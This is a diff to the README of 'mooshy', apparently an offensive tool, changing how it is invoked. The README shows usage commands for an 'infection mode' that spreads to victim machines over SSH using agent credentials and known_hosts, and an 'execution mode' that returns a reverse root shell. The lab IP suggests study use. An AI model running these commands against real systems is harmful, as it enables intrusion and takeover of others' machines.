@@ -21,8 +21,8 @@
 
 ## Usage:
 ```sh
-    $ ./bin/mooshy -help                                                       
-    Usage of ./bin/mooshy:
+    $ mooshy -help                                                       
+    Usage of mooshy:
       -addr string
         	The lucky guy
       -moosh string
@@ -50,8 +50,8 @@ The tool operates in 2 modes - infection and execution.
 
 ## Infection mode
 ```sh
-   ./bin/mooshy -ssh -useSSHAgent -sshUser averagejoe -addr 192.168.56.102 # Specific SSH host
-   ./bin/mooshy -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts -sshUser averagejoe # SSH known_hosts
+   mooshy -ssh -useSSHAgent -sshUser averagejoe -addr 192.168.56.102 # Specific SSH host
+   mooshy -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts -sshUser averagejoe # SSH known_hosts
 ```
 - Connects to the victim machine(s) using either of:
     - SSH:
@@ -70,7 +70,7 @@ The tool operates in 2 modes - infection and execution.
 
 ## Execution mode
 ```sh
-   ./bin/mooshy -addr 192.168.56.102:22 # The port should be any open port
+   mooshy -addr 192.168.56.102:22 # The port should be any open port
 ```
 - Connects to the infected victim and returns a reverse `root` shell.
 
